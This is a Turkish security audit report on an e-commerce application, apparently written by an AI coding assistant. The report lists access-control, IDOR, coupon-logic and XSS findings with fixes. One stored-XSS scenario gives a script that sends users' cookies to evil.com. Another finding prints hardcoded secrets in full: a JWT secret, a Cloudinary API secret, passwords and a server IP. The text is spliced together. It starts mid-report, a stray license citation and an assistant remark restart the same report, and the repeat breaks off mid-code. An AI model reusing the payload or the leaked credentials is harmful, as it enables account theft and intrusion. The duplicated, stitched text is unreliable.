- Blog sayfası (`dangerouslySetInnerHTML` kullanımı)

---

## 2. Yönetici Özeti

| Seviye | Bulgu Sayısı |
|--------|--------------|
| 🔴 KRİTİK | 5 |
| 🟠 YÜKSEK | 4 |
| 🟡 ORTA | 5 |
| 🔵 DÜŞÜK | 3 |

**Sistemin Genel Risk Seviyesi: YÜKSEK**

### En Acil 5 Aksiyon:
1. **Kupon (Coupon) endpoint'lerine yetkilendirme ekle** — Herhangi bir oturum açmış kullanıcı kupon oluşturabiliyor/silebiliyor
2. **Fatura PDF endpoint'ine ownership kontrolü ekle** — IDOR ile herkesin faturası indirilebilir
3. **docker-compose.yml ve repo'daki secret'ları temizle** — JWT secret, Cloudinary API secret, DB şifresi ve admin JWT token'ı açık halde
4. **Kupon kullanım sayacının her `calculateTotal` çağrısında artmasını düzelt** — Business logic hatası
5. **GlobalExceptionHandler'daki catch-all'da `ex.getMessage()` yerine genel mesaj dön** — Internal hata mesajları client'a sızıyor

---

## 3. Bulgular

---

### [C-01] Kupon Endpoint'lerinde Yetkilendirme Eksikliği (Broken Function-Level Authorization)

**Seviye:** 🔴 KRİTİK
**OWASP:** A01:2021 — Broken Access Control
**Güven Düzeyi:** Yüksek
**Konum:** [RestCouponControllerImpl.java](e-commerce/src/main/java/com/mehmetkerem/controller/impl/RestCouponControllerImpl.java#L25-L44) → `createCoupon()`, `deleteCoupon()`, `applyCoupon()`

**Açıklama:**
`POST /v1/coupons/create`, `POST /v1/coupons/apply` ve `DELETE /v1/coupons/{id}` endpoint'lerinde `@Secured` veya `@PreAuthorize` anotasyonu **yok**. SecurityConfig'de bu path'ler `/v1/admin/**` altında olmadığından, `.anyRequest().authenticated()` kuralına düşüyor — oturum açmış **herhangi bir kullanıcı** bu işlemleri yapabiliyor.

**Kanıt / Sorunlu Kod Akışı:**
```java
// RestCouponControllerImpl.java — @Secured anotasyonu YOK
@PostMapping("/create")
public ResultData<CouponResponse> createCoupon(@RequestBody CouponRequest request) {
    return ResultHelper.success(couponService.createCoupon(request));
}

@DeleteMapping("/{id}")
public ResultData<String> deleteCoupon(@PathVariable Long id) {
    couponService.deleteCoupon(id);
    return ResultHelper.success("Kupon silindi.");
}
```

**İstismar Senaryosu:**
Normal bir kullanıcı, kendine %100 indirimli bir kupon oluşturur ve sepetine uygular. Tüm ürünleri 0 TL'ye satın alır. Mevcut kuponları da silebilir.

**Etkisi:** Finansal kayıp, iş mantığı ihlali, veri bütünlüğü kaybı.

**Önerilen Düzeltme:**
```java
@Secured("ROLE_ADMIN")
@PostMapping("/create")
public ResultData<CouponResponse> createCoupon(...) { ... }

@Secured("ROLE_ADMIN")
@DeleteMapping("/{id}")
public ResultData<String> deleteCoupon(...) { ... }
```

---

### [C-02] Fatura PDF İndirme'de IDOR (Broken Object-Level Authorization)

**Seviye:** 🔴 KRİTİK
**OWASP:** A01:2021 — Broken Access Control
**Güven Düzeyi:** Yüksek
**Konum:** [RestOrderControllerImpl.java](e-commerce/src/main/java/com/mehmetkerem/controller/impl/RestOrderControllerImpl.java#L146-L155) → `downloadInvoicePdf()`

**Açıklama:**
`GET /v1/order/{orderId}/invoice/pdf` endpoint'inde **hiçbir yetkilendirme kontrolü yapılmıyor**. Aynı controller'daki `getOrderInvoice()` metodu doğru şekilde ownership kontrolü yaparken, PDF download metodu bu kontrolü **tamamen atlıyor**.

**Kanıt / Sorunlu Kod Akışı:**
```java
// ✅ JSON invoice — OwnerShip kontrolü VAR
@GetMapping("/{orderId}/invoice")
public ResultData<OrderInvoiceResponse> getOrderInvoice(@PathVariable Long orderId) {
    Order order = orderService.getOrderById(orderId);
    boolean isOwner = order.getUserId().equals(currentUserId);
    boolean isAdmin = ...;
    if (!isOwner && !isAdmin) throw ...;  // ✅ Doğru kontrol
}

// ❌ PDF invoice — Kontrol YOK
@GetMapping("/{orderId}/invoice/pdf")
public ResponseEntity<byte[]> downloadInvoicePdf(@PathVariable Long orderId) {
    byte[] pdfBytes = invoicePdfService.generateInvoicePdf(orderId);  // ❌ Direkt erişim
    return ResponseEntity.ok()...body(pdfBytes);
}
```

**İstismar Senaryosu:**
Saldırgan orderId'leri sırayla itereyerek (`/v1/order/1/invoice/pdf`, `/v1/order/2/invoice/pdf`, ...) tüm müşterilerin faturalarını (ad, adres, sipariş detayı) indirebilir.

**Etkisi:** Kişisel veri sızıntısı (PII), KVKK ihlali, müşteri bilgilerinin ifşası.

**Önerilen Düzeltme:**
```java
@GetMapping("/{orderId}/invoice/pdf")
public ResponseEntity<byte[]> downloadInvoicePdf(@PathVariable Long orderId) {
    Order order = orderService.getOrderById(orderId);
    Long currentUserId = SecurityUtils.getCurrentUserId();
    if (currentUserId == null) throw new InsufficientAuthenticationException("Oturum gerekli");
    boolean isOwner = order.getUserId().equals(currentUserId);
    boolean isAdmin = SecurityUtils.getCurrentUser() != null
            && SecurityUtils.getCurrentUser().getRole() == Role.ADMIN;
    if (!isOwner && !isAdmin) throw new BadRequestException("Bu faturayı indirme yetkiniz yok.");
    byte[] pdfBytes = invoicePdfService.generateInvoicePdf(orderId);
    return ResponseEntity.ok()...body(pdfBytes);
}
```

---

### [C-03] Repo'da Hardcoded Secret'lar ve Yayınlanmış JWT Token

**Seviye:** 🔴 KRİTİK
**OWASP:** A02:2021 — Cryptographic Failures
**Güven Düzeyi:** Yüksek
**Konum:**
- [docker-compose.yml](docker-compose.yml#L47-L51)
- [application.properties](e-commerce/src/main/resources/application.properties#L32)
- [token.json](e-commerce/token.json)
- [api-client.ts](can-antika-frontend/lib/api-client.ts#L3-L4)

**Açıklama:**
Birden fazla hassas veri repo'ya commit'lenmiş durumda:

| Veri | Dosya | Değer |
|------|-------|-------|
| JWT Secret | docker-compose.yml | `b3c7f2e8a91d4f5069c8e12a7b6d3f4e5a9c1d0872e4f6a8b3c5d7e9f0a1b2c3` |
| Cloudinary API Secret | docker-compose.yml | `dnR2_CjaiLKnxjhw64vJpaSjYqE` |
| DB Password (default) | application.properties | `mehmet619` |
| Admin Password (default) | application.properties | `admin123` |
| Admin JWT Token | token.json | Tam bearer token |
| Sunucu IP'si | api-client.ts | `http://116.202.106.185:8085` |

**İstismar Senaryosu:**
Repo'ya erişimi olan (veya geçmişte erişimi olan) herhangi biri JWT secret ile sahte admin token'ları üretebilir, Cloudinary hesabını kötüye kullanabilir veya doğrudan veritabanına bağlanabilir.

**Etkisi:** Tam sistem ele geçirme, veri ihlali.

**Önerilen Düzeltme:**
1. Tüm secret'ları environment variable olarak dışarıdan verin
2. `docker-compose.yml`'de `.env` dosyası referans edin
3. `token.json` dosyasını silin ve `.gitignore`'a ekleyin
4. Mevcut JWT secret'ı ve Cloudinary secret'ı **hemen** rotate edin
5. Git geçmişini `git filter-branch` veya `BFG` ile temizleyin

---

### [C-04] Kupon Kullanım Sayacı Business Logic Hatası (Double-Spend)

**Seviye:** 🔴 KRİTİK
**OWASP:** A04:2021 — Insecure Design
**Güven Düzeyi:** Yüksek
**Konum:** [CartServiceImpl.java](e-commerce/src/main/java/com/mehmetkerem/service/impl/CartServiceImpl.java#L194-L203) → `calculateTotal()`

**Açıklama:**
`calculateTotal()` metodu sepet toplamını hesaplarken `couponService.applyCoupon()` çağırıyor. Bu metot, kuponun `usageCount`'unu **her çağrıda artırıyor**. Sipariş oluşturma akışında `calculateTotal()` çağrıldığında kupon kullanımı artıyor ama aslında sipariş henüz oluşmamış. Sepet her görüntülendiğinde kupon tükeniyor.

**Kanıt / Sorunlu Kod Akışı:**
```java
// CartServiceImpl.calculateTotal()
public BigDecimal calculateTotal(Long userId) {
    Cart cart = getCartByUserId(userId);
    BigDecimal total = calculateRawTotal(cart);
    if (cart.getCouponCode() != null) {
        return couponService.applyCoupon(cart.getCouponCode(), total); // ❌ Her çağrıda usageCount++
    }
    return total;
}

// CouponServiceImpl.applyCoupon()
public BigDecimal applyCoupon(String code, BigDecimal cartTotal) {
    ...
    coupon.setUsageCount(coupon.getUsageCount() + 1); // ❌ Side effect
    couponRepository.save(coupon);
    ...
}
```

**İstismar Senaryosu:**
1. Saldırgan kupon uygulayıp sepet toplamını 500+ kez çağırarak kuponun kullanım limitini tüketir.
2. Meşru müşteriler kuponu kullanamaz.
3. Alternatif olarak `applyCoupon()` aynı anda iki kez çağrılırsa race condition ile limit aşılabilir (Coupon entity'de `@Version` var ama retry mekanizması yok).

**Etkisi:** Kupon manipülasyonu, iş mantığı ihlali, gelir kaybı.

**Önerilen Düzeltme:**
`calculateTotal()` içinde kupon indirimini **sadece hesapla, usage artırma**. Usage artırımını yalnızca `saveOrder()` akışında yap:
```java
// Yeni metot: sadece indirim hesabı, side-effect yok
public BigDecimal calculateDiscount(String code, BigDecimal cartTotal) {
    Coupon coupon = couponRepository.findByCode(code).orElseThrow(...);
    // Validate aktiflik, süre, limit... ama usageCount artırma
    return cartTotal.subtract(coupon.getDiscountAmount()).max(BigDecimal.ZERO);
}
```

---

### [C-05] Exception Handler'da Internal Bilgi Sızıntısı

**Seviye:** 🔴 KRİTİK
**OWASP:** A05:2021 — Security Misconfiguration
**Güven Düzeyi:** Yüksek
**Konum:** [GlobalExceptionHandler.java](e-commerce/src/main/java/com/mehmetkerem/handler/GlobalExceptionHandler.java#L78-L83) → `handleGeneralException()`

**Açıklama:**
Catch-all exception handler'da `ex.getMessage()` doğrudan HTTP response'a yazılıyor. Beklenmeyen hatalar (NPE, JPA hataları, veritabanı bağlantı hataları vb.) durumunda internal class adları, SQL sorguları, stack trace parçaları ve tablo/kolon isimleri client'a sızar.

**Kanıt / Sorunlu Kod Akışı:**
```java
@ExceptionHandler(Exception.class)
public ResponseEntity<Result> handleGeneralException(Exception ex) {
    log.error("Beklenmeyen hata oluştu: ", ex);
    return new ResponseEntity<>(
        ResultHelper.error(ex.getMessage(), HttpStatus.INTERNAL_SERVER_ERROR),  // ❌
        HttpStatus.INTERNAL_SERVER_ERROR);
}
```

**İstismar Senaryosu:**
Saldırgan, geçersiz girdi ile kasıtlı hatalar tetikler ve response'taki hata mesajlarından veritabanı şeması, tablo isimleri, framework detayları öğrenir; bu bilgiyi daha hedefli saldırılar için kullanır.

**Etkisi:** Bilgi sızıntısı, saldırı yüzeyinin genişlemesi.

**Önerilen Düzeltme:**
```java
@ExceptionHandler(Exception.class)
public ResponseEntity<Result> handleGeneralException(Exception ex) {
    log.error("Beklenmeyen hata oluştu: ", ex);
    return new ResponseEntity<>(
        ResultHelper.error("Beklenmeyen bir hata oluştu. Lütfen daha sonra tekrar deneyin.",
            HttpStatus.INTERNAL_SERVER_ERROR),
        HttpStatus.INTERNAL_SERVER_ERROR);
}
```

---

### [H-01] Havale Bildirimi Endpoint'inde Authentication ve Validation Eksikliği

**Seviye:** 🟠 YÜKSEK
**OWASP:** A01:2021 — Broken Access Control
**Güven Düzeyi:** Yüksek
**Konum:** [RestBankTransferControllerImpl.java](e-commerce/src/main/java/com/mehmetkerem/controller/impl/RestBankTransferControllerImpl.java#L49-L52) → `submitTransfer()`

**Açıklama:**
`POST /v1/bank-transfers` endpoint'i SecurityConfig'de `permitAll()` olarak tanımlı. Kimlik doğrulaması olmadan herhangi biri sahte havale bildirimi gönderebilir. `toEntity()` metodu request'ten gelen `orderId`, `amount`, `bankName`, `senderName` gibi alanları doğrudan entity'ye yazıyor; sipariş sahipliği veya tutarın doğruluğu kontrolü yapılmıyor.

**İstismar Senaryosu:**
Saldırgan başka birinin siparişi için sahte havale bildirimi gönderir. Admin bunu onaylarsa sipariş durumu otomatik olarak PAID'e güncellenir.

**Etkisi:** Ödeme sahteciliği, sipariş manipülasyonu.

**Önerilen Düzeltme:**
1. Endpoint'i authenticated yapın veya honeypot olarak bırakırsanız admin tarafında güçlü doğrulama ekleyin.
2. `submitTransfer()` içinde orderId'nin gerçekten mevcut ve PENDING durumda olduğunu, tutarın sipariş tutarıyla eşleştiğini kontrol edin.

---

### [H-02] Dosya Yükleme'de Content-Type Spoofing Riski

**Seviye:** 🟠 YÜKSEK
**OWASP:** A04:2021 — Insecure Design
**Güven Düzeyi:** Orta
**Konum:** [RestFileUploadControllerImpl.java](e-commerce/src/main/java/com/mehmetkerem/controller/impl/RestFileUploadControllerImpl.java#L65-L72) → `validateImage()`

**Açıklama:**
Dosya yükleme doğrulaması yalnızca `file.getContentType()` değerine bakıyor. Bu değer istemci tarafından kolaylıkla ayarlanabilir. Dosyanın gerçek içeriğini (magic bytes) doğrulamak için herhangi bir kontrol yok. Ayrıca dosya uzantısı üzerinde açık bir beyaz liste doğrulaması yapılmıyor — uzantı, orijinal dosya adından alınıp UUID'ye ekleniyor.

**Kanıt / Sorunlu Kod Akışı:**
```java
private void validateImage(MultipartFile file) {
    String contentType = file.getContentType();  // ❌ İstemci kontrollü
    if (contentType == null || !ALLOWED_CONTENT_TYPES.contains(contentType.toLowerCase())) {
        throw new BadRequestException("Sadece resim dosyaları yüklenebilir...");
    }
}
```

**İstismar Senaryosu:**
Saldırgan `Content-Type: image/jpeg` header'ı ile bir HTML veya SVG dosyası yükler. Dosya sunucuda saklanır ve doğrudan erişilirse tarayıcıda çalıştırılabilir (XSS).

**Önerilen Düzeltme:**
```java
private void validateImage(MultipartFile file) {
    // 1. Content-type kontrolü (mevcut)
    // 2. Uzantı beyaz listesi
    String ext = getExtension(file.getOriginalFilename()).toLowerCase();
    if (!Set.of(".jpg",".jpeg",".png",".gif",".webp").contains(ext)) {
        throw new BadRequestException("Geçersiz dosya uzantısı.");
    }
    // 3. Magic bytes kontrolü
    byte[] header = new byte[8];
    try (var is = file.getInputStream()) {
        is.read(header);
    }
    if (!isValidImageMagicBytes(header)) {
        throw new BadRequestException("Dosya içeriği geçerli bir resim değil.");
    }
}
```

---

### [H-03] sortBy Parametresinde Whitelist Eksikliği

**Seviye:** 🟠 YÜKSEK
**OWASP:** A03:2021 — Injection
**Güven Düzeyi:** Orta
**Konum:** Çoklu controller dosyası: [RestProductControllerImpl.java](e-commerce/src/main/java/com/mehmetkerem/controller/impl/RestProductControllerImpl.java#L78), [RestOrderControllerImpl.java](e-commerce/src/main/java/com/mehmetkerem/controller/impl/RestOrderControllerImpl.java#L55)

**Açıklama:**
Birçok endpoint'te `sortBy` parametresi kullanıcıdan alınıp doğrudan `Sort.by(sortBy)` ile kullanılıyor. Beyaz liste doğrulaması yok. Spring Data JPA, bilinmeyen property'lerde genellikle `PropertyReferenceException` fırlatır ve bu sayede SQL injection riski düşüktür. Ancak hata mesajları entity yapısını ve alan isimlerini ifşa eder, ayrıca bazı edge case'lerde persistence provider davranışı öngörülemez olabilir.

**Kanıt / Sorunlu Kod Akışı:**
```java
Sort sort = direction.equalsIgnoreCase("desc")
    ? Sort.by(sortBy).descending()  // sortBy = kullanıcı girdisi, whitelist YOK
    : Sort.by(sortBy).ascending();
```

**İstismar Senaryosu:**
`?sortBy=passwordHash` gibi bir istek gönderildiğinde, User entity'deki gizli alanlar üzerinden sıralama yapılabilir ve timing/response farklılıklarıyla alan değerleri çıkarılabilir (blind information disclosure).

**Önerilen Düzeltme:**
```java
private static final Set<String> ALLOWED_SORT_FIELDS = Set.of("id", "title", "price", "createdAt");

String safeSortBy = ALLOWED_SORT_FIELDS.contains(sortBy) ? sortBy : "id";
Sort sort = Sort.by(safeSortBy);
```

---

### [H-04] JWT Logout'ta Server-Side Token İptali Yok

**Seviye:** 🟠 YÜKSEK
**OWASP:** A07:2021 — Identification and Authentication Failures
**Güven Düzeyi:** Yüksek
**Konum:** [auth-context.tsx](can-antika-frontend/lib/auth-context.tsx#L73-L77) → `logout()`, Backend'de logout endpoint yok

**Açıklama:**
Logout işlemi sadece frontend tarafında localStorage'dan token'ları temizliyor. Backend'de:
1. Access token blacklist mekanizması yok — token süresi dolana kadar (30 dk) geçerli kalır
2. Refresh token server-side olarak silinmiyor — saldırgan tarafından ele geçirilmişse kullanılabilir
3. Logout API endpoint'i hiç bulunmuyor

**İstismar Senaryosu:**
Token XSS veya ağ dinleme ile ele geçirilirse, kullanıcı çıkış yapsa bile saldırgan 30 dakika boyunca hesabı kullanmaya devam eder. Refresh token ile de yeni access token alabilir.

**Önerilen Düzeltme:**
```java
@PostMapping("/logout")
public ResultData<String> logout(Authentication authentication) {
    User user = (User) authentication.getPrincipal();
    refreshTokenService.deleteByUserId(user.getId());
    return ResultHelper.success("Çıkış yapıldı.");
}
```
Ayrıca access token için kısa ömür (mevcut 30dk uygun) ve Redis tabanlı blacklist düşünülebilir.

---

### [M-01] Stored XSS Riski — Blog İçeriği Sanitize Edilmeden Render Ediliyor

**Seviye:** 🟡 ORTA
**OWASP:** A03:2021 — Injection (XSS)
**Güven Düzeyi:** Orta
**Konum:** [blog/\[slug\]/page.tsx](can-antika-frontend/app/blog/[slug]/page.tsx#L192) → `dangerouslySetInnerHTML`

**Açıklama:**
Blog yazısının `content` alanı backend'den geldiği gibi `dangerouslySetInnerHTML` ile render ediliyor. Backend'de de blog post oluşturma/güncelleme sırasında HTML sanitizasyonu yapılmıyor. Blog yazıları admin tarafından oluşturulsa da, admin hesabı ele geçirilirse veya güvenilmeyen bir editör blog yazdığında, saklanan XSS mümkündür.

**İstismar Senaryosu:**
Ele geçirilmiş admin hesabı üzerinden blog yazısına `<script>document.location='https://evil.com/steal?c='+document.cookie</script>` enjekte edilir. Blogu ziyaret eden her kullanıcının JWT token'ı çalınır.

**Önerilen Düzeltme:**
Frontend'de DOMPurify gibi bir kütüphane ile HTML sanitize edin:
```tsx
import DOMPurify from 'dompurify';
dangerouslySetInnerHTML={{ __html: DOMPurify.sanitize(post.content) }}
```

---

### [M-02] Güvenlik Başlıkları (Security Headers) Eksik

**Seviye:** 🟡 ORTA
**OWASP:** A05:2021 — Security Misconfiguration
**Güven Düzeyi:** Yüksek
**Konum:** [SecurityConfig.java](e-commerce/src/main/java/com/mehmetkerem/config/SecurityConfig.java), [next.config.mjs](can-antika-frontend/next.config.mjs)

**Açıklama:**
Ne backend ne de frontend'te güvenlik başlıkları yapılandırılmış. Eksik başlıklar:
- **Content-Security-Policy** — XSS mitigasyonu
- **X-Frame-Options / frame-ancestors** — Clickjacking koruması
- **Strict-Transport-Security (HSTS)** — HTTPS zorlama
- **X-Content-Type-Options: nosniff** — MIME sniffing koruması
- **Referrer-Policy** — Bilgi sızıntısı önleme
- **Permissions-Policy** — Tarayıcı özellik kısıtlama

**Önerilen Düzeltme (Backend):**
```java
http.headers(headers -> headers
    .contentSecurityPolicy(csp -> csp.policyDirectives("default-src 'self'; script-src 'self'"))
    .frameOptions(fo -> fo.deny())
    .httpStrictTransportSecurity(hsts -> hsts.maxAgeInSeconds(31536000).includeSubDomains(true))
    .contentTypeOptions(Customizer.withDefaults())
    .referrerPolicy(rp -> rp.policy(ReferrerPolicyHeaderWriter.ReferrerPolicy.STRICT_ORIGIN_WHEN_CROSS_ORIGIN))
);
```

**Önerilen Düzeltme (Frontend — next.config.mjs):**
```js
async headers() {
    return [{
        source: '/(.*)',
        headers: [
            { key: 'X-Frame-Options', value: 'DENY' },
            { key: 'X-Content-Type-Options', value: 'nosniff' },
            { key: 'Referrer-Policy', value: 'strict-origin-when-cross-origin' },
        ],
    }];
}
```


## License: unknown
https://github.com/praveenjuge/praveenjuge/blob/f7c607592efe59257f18e3337868dd9519bec159/next.config.js

```
Now I have enough data to compile the full report. Let me organize everything.

---

# 🛡️ CAN ANTİKA — Uçtan Uca Güvenlik Denetim Raporu

---

## 1. İncelenen Dosya/Kod Alanlarının Kısa Özeti

**Backend (Spring Boot 3.2.2 / Java 17):**
- Security Config: [SecurityConfig.java](e-commerce/src/main/java/com/mehmetkerem/config/SecurityConfig.java), [WebMvcConfig.java](e-commerce/src/main/java/com/mehmetkerem/config/WebMvcConfig.java)
- JWT: [JwtService.java](e-commerce/src/main/java/com/mehmetkerem/jwt/JwtService.java), [JwtAuthFilter.java](e-commerce/src/main/java/com/mehmetkerem/jwt/JwtAuthFilter.java)
- Auth: [AuthService.java](e-commerce/src/main/java/com/mehmetkerem/service/impl/AuthService.java), [RefreshTokenService.java](e-commerce/src/main/java/com/mehmetkerem/service/impl/RefreshTokenService.java)
- Tüm Controller impl (27 adet), Service impl (32 adet), Repository (28 adet), Entity/Model (30 adet), DTO (65 adet)
- Exception Handler: [GlobalExceptionHandler.java](e-commerce/src/main/java/com/mehmetkerem/handler/GlobalExceptionHandler.java)
- Rate Limiting: [RateLimitFilter.java](e-commerce/src/main/java/com/mehmetkerem/config/RateLimitFilter.java)
- File Upload: [FileSystemStorageService.java](e-commerce/src/main/java/com/mehmetkerem/service/impl/FileSystemStorageService.java), [RestFileUploadControllerImpl.java](e-commerce/src/main/java/com/mehmetkerem/controller/impl/RestFileUploadControllerImpl.java)
- Config: [application.properties](e-commerce/src/main/resources/application.properties), [docker-compose.yml](docker-compose.yml)

**Frontend (Next.js / React / TypeScript):**
- [api-client.ts](can-antika-frontend/lib/api-client.ts), [auth-context.tsx](can-antika-frontend/lib/auth-context.tsx), [next.config.mjs](can-antika-frontend/next.config.mjs)
- Blog sayfası (`dangerouslySetInnerHTML` kullanımı)

---

## 2. Yönetici Özeti

| Seviye | Bulgu Sayısı |
|--------|--------------|
| 🔴 KRİTİK | 5 |
| 🟠 YÜKSEK | 4 |
| 🟡 ORTA | 5 |
| 🔵 DÜŞÜK | 3 |

**Sistemin Genel Risk Seviyesi: YÜKSEK**

### En Acil 5 Aksiyon:
1. **Kupon (Coupon) endpoint'lerine yetkilendirme ekle** — Herhangi bir oturum açmış kullanıcı kupon oluşturabiliyor/silebiliyor
2. **Fatura PDF endpoint'ine ownership kontrolü ekle** — IDOR ile herkesin faturası indirilebilir
3. **docker-compose.yml ve repo'daki secret'ları temizle** — JWT secret, Cloudinary API secret, DB şifresi ve admin JWT token'ı açık halde
4. **Kupon kullanım sayacının her `calculateTotal` çağrısında artmasını düzelt** — Business logic hatası
5. **GlobalExceptionHandler'daki catch-all'da `ex.getMessage()` yerine genel mesaj dön** — Internal hata mesajları client'a sızıyor

---

## 3. Bulgular

---

### [C-01] Kupon Endpoint'lerinde Yetkilendirme Eksikliği (Broken Function-Level Authorization)

**Seviye:** 🔴 KRİTİK
**OWASP:** A01:2021 — Broken Access Control
**Güven Düzeyi:** Yüksek
**Konum:** [RestCouponControllerImpl.java](e-commerce/src/main/java/com/mehmetkerem/controller/impl/RestCouponControllerImpl.java#L25-L44) → `createCoupon()`, `deleteCoupon()`, `applyCoupon()`

**Açıklama:**
`POST /v1/coupons/create`, `POST /v1/coupons/apply` ve `DELETE /v1/coupons/{id}` endpoint'lerinde `@Secured` veya `@PreAuthorize` anotasyonu **yok**. SecurityConfig'de bu path'ler `/v1/admin/**` altında olmadığından, `.anyRequest().authenticated()` kuralına düşüyor — oturum açmış **herhangi bir kullanıcı** bu işlemleri yapabiliyor.

**Kanıt / Sorunlu Kod Akışı:**
```java
// RestCouponControllerImpl.java — @Secured anotasyonu YOK
@PostMapping("/create")
public ResultData<CouponResponse> createCoupon(@RequestBody CouponRequest request) {
    return ResultHelper.success(couponService.createCoupon(request));
}

@DeleteMapping("/{id}")
public ResultData<String> deleteCoupon(@PathVariable Long id) {
    couponService.deleteCoupon(id);
    return ResultHelper.success("Kupon silindi.");
}
```

**İstismar Senaryosu:**
Normal bir kullanıcı, kendine %100 indirimli bir kupon oluşturur ve sepetine uygular. Tüm ürünleri 0 TL'ye satın alır. Mevcut kuponları da silebilir.

**Etkisi:** Finansal kayıp, iş mantığı ihlali, veri bütünlüğü kaybı.

**Önerilen Düzeltme:**
```java
@Secured("ROLE_ADMIN")
@PostMapping("/create")
public ResultData<CouponResponse> createCoupon(...) { ... }

@Secured("ROLE_ADMIN")
@DeleteMapping("/{id}")
public ResultData<String> deleteCoupon(...) { ... }
```

---

### [C-02] Fatura PDF İndirme'de IDOR (Broken Object-Level Authorization)

**Seviye:** 🔴 KRİTİK
**OWASP:** A01:2021 — Broken Access Control
**Güven Düzeyi:** Yüksek
**Konum:** [RestOrderControllerImpl.java](e-commerce/src/main/java/com/mehmetkerem/controller/impl/RestOrderControllerImpl.java#L146-L155) → `downloadInvoicePdf()`

**Açıklama:**
`GET /v1/order/{orderId}/invoice/pdf` endpoint'inde **hiçbir yetkilendirme kontrolü yapılmıyor**. Aynı controller'daki `getOrderInvoice()` metodu doğru şekilde ownership kontrolü yaparken, PDF download metodu bu kontrolü **tamamen atlıyor**.

**Kanıt / Sorunlu Kod Akışı:**
```java
// ✅ JSON invoice — OwnerShip kontrolü VAR
@GetMapping("/{orderId}/invoice")
public ResultData<OrderInvoiceResponse> getOrderInvoice(@PathVariable Long orderId) {
    Order order = orderService.getOrderById(orderId);
    boolean isOwner = order.getUserId().equals(currentUserId);
    boolean isAdmin = ...;
    if (!isOwner && !isAdmin) throw ...;  // ✅ Doğru kontrol
}

// ❌ PDF invoice — Kontrol YOK
@GetMapping("/{orderId}/invoice/pdf")
public ResponseEntity<byte[]> downloadInvoicePdf(@PathVariable Long orderId) {
    byte[] pdfBytes = invoicePdfService.generateInvoicePdf(orderId);  // ❌ Direkt erişim
    return ResponseEntity.ok()...body(pdfBytes);
}
```

**İstismar Senaryosu:**
Saldırgan orderId'leri sırayla itereyerek (`/v1/order/1/invoice/pdf`, `/v1/order/2/invoice/pdf`, ...) tüm müşterilerin faturalarını (ad, adres, sipariş detayı) indirebilir.

**Etkisi:** Kişisel veri sızıntısı (PII), KVKK ihlali, müşteri bilgilerinin ifşası.

**Önerilen Düzeltme:**
```java
@GetMapping("/{orderId}/invoice/pdf")
public ResponseEntity<byte[]> downloadInvoicePdf(@PathVariable Long orderId) {
    Order order = orderService.getOrderById(orderId);
    Long currentUserId = SecurityUtils.getCurrentUserId();
    if (currentUserId == null) throw new InsufficientAuthenticationException("Oturum gerekli");
    boolean isOwner = order.getUserId().equals(currentUserId);
    boolean isAdmin = SecurityUtils.getCurrentUser() != null
            && SecurityUtils.getCurrentUser().getRole() == Role.ADMIN;
    if (!isOwner && !isAdmin) throw new BadRequestException("Bu faturayı indirme yetkiniz yok.");
    byte[] pdfBytes = invoicePdfService.generateInvoicePdf(orderId);
    return ResponseEntity.ok()...body(pdfBytes);
}
```

---

### [C-03] Repo'da Hardcoded Secret'lar ve Yayınlanmış JWT Token

**Seviye:** 🔴 KRİTİK
**OWASP:** A02:2021 — Cryptographic Failures
**Güven Düzeyi:** Yüksek
**Konum:**
- [docker-compose.yml](docker-compose.yml#L47-L51)
- [application.properties](e-commerce/src/main/resources/application.properties#L32)
- [token.json](e-commerce/token.json)
- [api-client.ts](can-antika-frontend/lib/api-client.ts#L3-L4)

**Açıklama:**
Birden fazla hassas veri repo'ya commit'lenmiş durumda:

| Veri | Dosya | Değer |
|------|-------|-------|
| JWT Secret | docker-compose.yml | `b3c7f2e8a91d4f5069c8e12a7b6d3f4e5a9c1d0872e4f6a8b3c5d7e9f0a1b2c3` |
| Cloudinary API Secret | docker-compose.yml | `dnR2_CjaiLKnxjhw64vJpaSjYqE` |
| DB Password (default) | application.properties | `mehmet619` |
| Admin Password (default) | application.properties | `admin123` |
| Admin JWT Token | token.json | Tam bearer token |
| Sunucu IP'si | api-client.ts | `http://116.202.106.185:8085` |

**İstismar Senaryosu:**
Repo'ya erişimi olan (veya geçmişte erişimi olan) herhangi biri JWT secret ile sahte admin token'ları üretebilir, Cloudinary hesabını kötüye kullanabilir veya doğrudan veritabanına bağlanabilir.

**Etkisi:** Tam sistem ele geçirme, veri ihlali.

**Önerilen Düzeltme:**
1. Tüm secret'ları environment variable olarak dışarıdan verin
2. `docker-compose.yml`'de `.env` dosyası referans edin
3. `token.json` dosyasını silin ve `.gitignore`'a ekleyin
4. Mevcut JWT secret'ı ve Cloudinary secret'ı **hemen** rotate edin
5. Git geçmişini `git filter-branch` veya `BFG` ile temizleyin

---

### [C-04] Kupon Kullanım Sayacı Business Logic Hatası (Double-Spend)

**Seviye:** 🔴 KRİTİK
**OWASP:** A04:2021 — Insecure Design
**Güven Düzeyi:** Yüksek
**Konum:** [CartServiceImpl.java](e-commerce/src/main/java/com/mehmetkerem/service/impl/CartServiceImpl.java#L194-L203) → `calculateTotal()`

**Açıklama:**
`calculateTotal()` metodu sepet toplamını hesaplarken `couponService.applyCoupon()` çağırıyor. Bu metot, kuponun `usageCount`'unu **her çağrıda artırıyor**. Sipariş oluşturma akışında `calculateTotal()` çağrıldığında kupon kullanımı artıyor ama aslında sipariş henüz oluşmamış. Sepet her görüntülendiğinde kupon tükeniyor.

**Kanıt / Sorunlu Kod Akışı:**
```java
// CartServiceImpl.calculateTotal()
public BigDecimal calculateTotal(Long userId) {
    Cart cart = getCartByUserId(userId);
    BigDecimal total = calculateRawTotal(cart);
    if (cart.getCouponCode() != null) {
        return couponService.applyCoupon(cart.getCouponCode(), total); // ❌ Her çağrıda usageCount++
    }
    return total;
}

// CouponServiceImpl.applyCoupon()
public BigDecimal applyCoupon(String code, BigDecimal cartTotal) {
    ...
    coupon.setUsageCount(coupon.getUsageCount() + 1); // ❌ Side effect
    couponRepository.save(coupon);
    ...
}
```

**İstismar Senaryosu:**
1. Saldırgan kupon uygulayıp sepet toplamını 500+ kez çağırarak kuponun kullanım limitini tüketir.
2. Meşru müşteriler kuponu kullanamaz.
3. Alternatif olarak `applyCoupon()` aynı anda iki kez çağrılırsa race condition ile limit aşılabilir (Coupon entity'de `@Version` var ama retry mekanizması yok).

**Etkisi:** Kupon manipülasyonu, iş mantığı ihlali, gelir kaybı.

**Önerilen Düzeltme:**
`calculateTotal()` içinde kupon indirimini **sadece hesapla, usage artırma**. Usage artırımını yalnızca `saveOrder()` akışında yap:
```java
// Yeni metot: sadece indirim hesabı, side-effect yok
public BigDecimal calculateDiscount(String code, BigDecimal cartTotal) {
    Coupon coupon = couponRepository.findByCode(code).orElseThrow(...);
